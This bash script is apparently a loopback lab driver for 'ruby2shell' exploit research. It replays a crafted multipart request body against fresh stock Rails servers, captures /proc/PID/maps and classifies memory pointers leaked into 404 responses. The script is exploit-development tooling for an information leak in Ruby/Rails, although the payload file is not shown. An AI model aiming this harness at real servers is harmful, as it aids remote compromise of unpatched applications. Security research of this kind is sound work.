#!/bin/bash
# Stock-Rails wire-leak classification driver (analysis only, loopback).
#
# Replays the consH20-tail/stage2d wire geometry (N=524, 32x1024 drain
# parts carrying the [0x250,0x90] pattern, 256-byte pattern filler,
# _method 'a'+523x0xDF with 00005102 tail, method-first) against a fresh
# unmodified `rails new --minimal` process per run, and — for every run
# whose process is still alive after the 404 response — snapshots
# /proc/PID/maps from OUTSIDE the request path. Surviving 404 bodies are
# then byte-scanned by ruby2shell-reflect-scan.py and any reflected
# pointer is classified against the snapshot by ruby2shell-leak-maps.py.
# No custom middleware, no debugger writes; mtrace.so runs as the 4-page
# case probe for geometry logging only.
#
# Usage: RUBY2SHELL_LEAKCLASS_COUNT=24 bash lab/repro/ruby2shell-stock-leakclass.sh
set -u
cd "$(dirname "$0")/../.." || exit 1
EV=lab/build/evidence
APP=lab/build/rails-stock-app
RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
BODY_SRC="$EV/stock-rails-rails-stage2d-n524-r238.body"
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
BASE=4610

if [ "${1:-}" = "--one" ]; then
  i="$2"
  PORT=$((BASE + i % 6))
  TAG="leakclass-$i"
  BODY="$EV/stock-rails-$TAG.body"
  HTML="$EV/stock-rails-$TAG.html"
  LOG="$EV/stock-rails-$TAG.server.log"
  PIDFILE="$PWD/$EV/stock-rails-$TAG.pid"
  ARM="$PWD/$EV/stock-rails-$TAG.case-arm"
  [ -f "$BODY_SRC" ] || exit 0
  [ -f "$APP/config/environment.rb" ] || exit 0
  cp "$BODY_SRC" "$BODY" || exit 0
  N=524
  MTRACE_FD=2 MTRACE_CASE_ONLY=1 MTRACE_CASE_REQUEST=$((N + 44)) \
    MTRACE_CASE_ARM_FILE="$ARM" LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDFILE" \
    > "$LOG" 2>&1 &
  PID=$!
  READY=NO
  for _ in $(seq 1 300); do
    curl -s -m 1 "http://127.0.0.1:$PORT/up" >/dev/null 2>&1 && { READY=YES; break; }
    sleep 0.1
  done
  if [ "$READY" != YES ]; then kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null; exit 0; fi
  touch "$ARM"
  curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
    --data-binary "@$BODY" -o "$HTML" -w '%{http_code}' 2>>"$LOG" \
    > "$EV/stock-rails-$TAG.http"
  rm -f "$ARM"
  if kill -0 "$PID" 2>/dev/null; then
    cat "/proc/$PID/maps" > "$EV/stock-rails-$TAG.maps" 2>/dev/null
    kill "$PID" 2>/dev/null
  fi
  wait "$PID" 2>/dev/null
  exit 0
fi

COUNT="${RUBY2SHELL_LEAKCLASS_COUNT:-24}"
if [ ! -f "$BODY_SRC" ]; then
  echo "missing $BODY_SRC; regenerate with the consH20-tail geometry" >&2
  exit 2
fi
if [ ! -f "$APP/config/environment.rb" ]; then
  echo "missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh" >&2
  exit 2
fi
rm -f "$EV"/stock-rails-leakclass-*.{body,html,http,server.log,maps,pid,case-arm} 2>/dev/null
seq 1 "$COUNT" | xargs -P6 -I{} "$0" --one {}
python3 lab/repro/ruby2shell-leak-maps.py leakclass-
